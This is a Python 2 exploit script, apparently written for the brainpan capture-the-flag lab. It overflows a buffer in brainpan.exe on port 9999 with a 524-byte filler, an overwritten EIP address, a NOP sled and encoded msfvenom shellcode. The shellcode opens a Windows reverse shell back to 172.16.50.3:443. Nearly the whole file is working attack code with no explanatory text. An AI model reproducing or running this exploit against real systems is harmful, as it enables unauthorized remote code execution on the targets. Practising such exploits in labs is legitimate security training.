#!/usr/bin/python
import socket
try:
    print "\nSending evil buffer..."
    # Per msf-pattern_offset, exact match at 524 bytes 
    filler = "\x41" * 524
    eip = "\xf3\x12\x17\x31"    # from brainpan.exe
    nops = "\x90" * 8
    #msfvenom -p windows/shell_reverse_tcp LHOST=172.16.50.3 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00"
    shell = (
    "\xd9\xed\xd9\x74\x24\xf4\xbe\x1c\x20\x1c\x5b\x58\x31\xc9\xb1"
    "\x52\x83\xe8\xfc\x31\x70\x13\x03\x6c\x33\xfe\xae\x70\xdb\x7c"
    "\x50\x88\x1c\xe1\xd8\x6d\x2d\x21\xbe\xe6\x1e\x91\xb4\xaa\x92"
    "\x5a\x98\x5e\x20\x2e\x35\x51\x81\x85\x63\x5c\x12\xb5\x50\xff"
    "\x90\xc4\x84\xdf\xa9\x06\xd9\x1e\xed\x7b\x10\x72\xa6\xf0\x87"
    "\x62\xc3\x4d\x14\x09\x9f\x40\x1c\xee\x68\x62\x0d\xa1\xe3\x3d"
    "\x8d\x40\x27\x36\x84\x5a\x24\x73\x5e\xd1\x9e\x0f\x61\x33\xef"
    "\xf0\xce\x7a\xdf\x02\x0e\xbb\xd8\xfc\x65\xb5\x1a\x80\x7d\x02"
    "\x60\x5e\x0b\x90\xc2\x15\xab\x7c\xf2\xfa\x2a\xf7\xf8\xb7\x39"
    "\x5f\x1d\x49\xed\xd4\x19\xc2\x10\x3a\xa8\x90\x36\x9e\xf0\x43"
    "\x56\x87\x5c\x25\x67\xd7\x3e\x9a\xcd\x9c\xd3\xcf\x7f\xff\xbb"
    "\x3c\xb2\xff\x3b\x2b\xc5\x8c\x09\xf4\x7d\x1a\x22\x7d\x58\xdd"
    "\x45\x54\x1c\x71\xb8\x57\x5d\x58\x7f\x03\x0d\xf2\x56\x2c\xc6"
    "\x02\x56\xf9\x49\x52\xf8\x52\x2a\x02\xb8\x02\xc2\x48\x37\x7c"
    "\xf2\x73\x9d\x15\x99\x8e\x76\xb6\x4e\xa2\x85\xae\x6c\xc2\x88"
    "\x95\xf8\x24\xe0\xf9\xac\xff\x9d\x60\xf5\x8b\x3c\x6c\x23\xf6"
    "\x7f\xe6\xc0\x07\x31\x0f\xac\x1b\xa6\xff\xfb\x41\x61\xff\xd1"
    "\xed\xed\x92\xbd\xed\x78\x8f\x69\xba\x2d\x61\x60\x2e\xc0\xd8"
    "\xda\x4c\x19\xbc\x25\xd4\xc6\x7d\xab\xd5\x8b\x3a\x8f\xc5\x55"
    "\xc2\x8b\xb1\x09\x95\x45\x6f\xec\x4f\x24\xd9\xa6\x3c\xee\x8d"
    "\x3f\x0f\x31\xcb\x3f\x5a\xc7\x33\xf1\x33\x9e\x4c\x3e\xd4\x16"
    "\x35\x22\x44\xd8\xec\xe6\x74\x93\xac\x4f\x1d\x7a\x25\xd2\x40"
    "\x7d\x90\x11\x7d\xfe\x10\xea\x7a\x1e\x51\xef\xc7\x98\x8a\x9d"
    "\x58\x4d\xac\x32\x58\x44"
    )
    buffer = filler+eip+nops+shell
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("172.16.101.21",9999))
    s.send(buffer)

    s.close()

    print "\nDone!"
except:
    print "Could not connect!"

